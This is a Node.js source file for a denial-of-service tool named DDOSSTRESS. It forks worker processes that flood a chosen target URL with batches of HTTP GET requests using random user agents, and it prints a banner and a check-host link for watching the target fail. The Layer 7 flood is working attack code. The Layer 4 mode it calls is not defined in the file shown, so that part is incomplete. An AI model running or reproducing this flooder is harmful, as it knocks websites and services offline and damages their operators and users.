import cluster from "node:cluster";
import chalk from "chalk";
import { URL } from "url";
import { createRequire } from "module";
import net from "net";
import http from "http";
import https from "https";
import fs from "fs";
import figlet from "figlet";
import gradient from "gradient-string";
import tls from "tls";
import crypto from "crypto";

const require = createRequire(import.meta.url);
let raw;
try { raw = require("raw-socket"); } catch {}

const userAgents = fs.readFileSync("./useragents.txt", "utf-8")
                     .split("\n")
                     .filter(line => line.trim().length > 0);

if (process.argv.length < 7) {
  console.log(chalk.red("Usage: node ddosstress2.js <target> <threads> <duration_sec> --layer <layer4|layer7>"));
  process.exit(1);
}

const targetStr   = process.argv[2];
const concurrency = parseInt(process.argv[3], 10) || 5;
const durationSec = parseInt(process.argv[4], 10) || 60;
const duration    = durationSec * 1000;
const layerFlag   = process.argv[6].toLowerCase() || "layer7";
const PACKET_SIZE = 432492;

let urlObj, hostname, port, protocol;
try {
  if (/^https?:\/\//i.test(targetStr)) {
    urlObj = new URL(targetStr);
    hostname = urlObj.hostname;
    protocol = urlObj.protocol;
    port = urlObj.port ? parseInt(urlObj.port, 10) : (protocol === "https:" ? 443 : 80);
  } else {
    protocol = "http:";
    hostname = targetStr;
    port = 80;
    urlObj = new URL(`${protocol}//${hostname}:${port}`);
  }
} catch {
  console.log(chalk.red("Invalid target"));
  process.exit(1);
}

async function checkPort(host, port) {
  return new Promise(resolve => {
    const socket = net.createConnection({ host, port, timeout: 2000 }, () => {
      socket.destroy();
      resolve(true);
    });
    socket.on("error", () => resolve(false));
    socket.on("timeout", () => { socket.destroy(); resolve(false); });
  });
}
console.log(chalk.green.bold("=================================================="));
function printBanner() {
  try {
    console.log(gradient.pastel.multiline(
      figlet.textSync("DDOSSTRESS", { horizontalLayout: "default" })
    ));
  } catch {
  console.log(chalk.green.bold("=================================================="));
  
    console.log(chalk.bold("__  __                  __  __          _                 \n" +
                           "|  \\/  | ___  __ _  __ _|  \\/  | ___  __| |_   _ ___  __ _ \n" +
                           "| |\\/| |/ _ \\/ _` |/ _` | |\\/| |/ _ \\/ _` | | | / __|/ _` |\n" +
                           "| |  | |  __/ (_| | (_| | |  | |  __/ (_| | |_| \\__ \\ (_| |\n" +
                           "|_|  |_|\\___|\\__, |\\__,_|_|  |_|\\___|\\__,_|\\__,_|___/\\__,_|\n" +
                           "              |___/                                         "));
  }

  console.log(chalk.gray(`                              v3.3\n`));
  console.log(chalk.red("-> ") + chalk.yellow("Target     ") + "📌 " + chalk.green(urlObj.href));
  console.log(chalk.red("-> ") + chalk.yellow("Threads    ") + "🧵 " + chalk.blue(concurrency));
  console.log(chalk.red("-> ") + chalk.yellow("Duration   ") + "⏱ " + chalk.green(durationSec + "s"));
    console.log("[31m-> [0mGithub[33m 🗂 : [32mhttps://github.com/chainner190");
  console.log("[31m-> [0mCheck-Host[33m 🗂 :  [32mhttps://check-host.net/check-http?host=" + process.argv[0x2]);
  console.log(chalk.red("-> ") + chalk.yellow("Layer      ") + "🌐 " + chalk.magenta(layerFlag)); console.log(chalk.green.bold("=================================================="));
}

// --- Master ---
if (cluster.isPrimary) {
  (async () => {
    const isOpen = await checkPort(hostname, port);

    printBanner();
    console.log(chalk.yellow(`Port state : ${isOpen ? chalk.green("OPEN") : chalk.red("CLOSED")}`));

    for (let id = 1; id <= concurrency; id++) {
      await new Promise(resolve => {
        const worker = cluster.fork({
          WORKER_ID: id,
          URL: urlObj.href,
          LAYER: layerFlag,
          DURATION: duration
        });
        worker.once("online", () => resolve());
      });
    }

    setTimeout(() => {
      console.log(chalk.red.bold("\n[ DDOSSTRESS ] Time is up, stopping all engines..."));
      for (const id in cluster.workers) cluster.workers[id].kill();
      process.exit(0);
    }, duration);

    cluster.on("exit", (worker) => {
      const wid = worker?.process?.env?.WORKER_ID || worker.id;
      console.log(chalk.yellow(`[ DDOSSTRESS ] -> Engine ${wid} exited`));
    });
  })();
} else {
  const wid = parseInt(process.env.WORKER_ID, 10);
  const layer = process.env.LAYER;
  const targetUrl = new URL(process.env.URL);

  console.log(chalk.green(`[ DDOSSTRESS ] -> Engine ${wid} Started`));

  if (layer === "layer4") {
    mainWorkerLayer4(wid, targetUrl.hostname, targetUrl.port);
  } else {
    mainWorkerLayer7(wid, targetUrl);
  }
}

// --- Error Collector ---
const errorStats = {};
function collectError(ip, msg) {
  const key = `${ip}|${msg}`;
  errorStats[key] = (errorStats[key] || 0) + 1;
}
setInterval(() => {
  const keys = Object.keys(errorStats).sort();
  for (const key of keys) {
    const [ip, msg] = key.split("|");
    console.log(chalk.red(`[ DDOSSTRESS ] -> (${ip}) An error has occured: ${msg} [x${errorStats[key]}]`));
  }
  for (const k in errorStats) delete errorStats[k];
}, 30000);

// --- Layer 7 ---
// --- Layer 7 ---
async function mainWorkerLayer7(workerId, targetUrl) {
  const MAX_REQUESTS = 10000000;
  const BATCH_SIZE   = 3000;
  let sentRequests = 0, errors = 0;
  const lib = targetUrl.protocol === "https:" ? https : http;
  const agent = new lib.Agent({ keepAlive: true, maxSockets: 20000 });

  const endTime = Date.now() + duration;

  while (sentRequests < MAX_REQUESTS && Date.now() < endTime) {
    const batch = [];

    for (let i = 0; i < BATCH_SIZE && sentRequests + i < MAX_REQUESTS; i++) {
      const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
      batch.push(new Promise(resolve => {
        const options = { agent, headers: { "User-Agent": randomUA } };
        const req = lib.get(targetUrl, options, res => {
          sentRequests++;

          if (res.statusCode >= 400) {
            collectError(targetUrl.hostname, `error ${res.statusCode} (${res.statusMessage})`);
          }

          res.resume();
          resolve();
        });
        req.on("error", (err) => {
          errors++;
          collectError(targetUrl.hostname, `${err.code || "ECONN"} (Connection error)`);
          resolve();
        });
      }));
    }

    if (batch.length === 0) break;  // 🔥 kalau udah gak ada request, langsung berhenti

    await Promise.all(batch);
    await new Promise(r => setTimeout(r, 10));
  }

  // 🔥 setelah loop selesai, otomatis berhenti worker
  console.log(chalk.cyan(`[ DDOSSTRESS ] -> Engine ${workerId} Finished. Total Requests: ${sentRequests}, Errors: ${errors}`));
  process.exit(0);
}

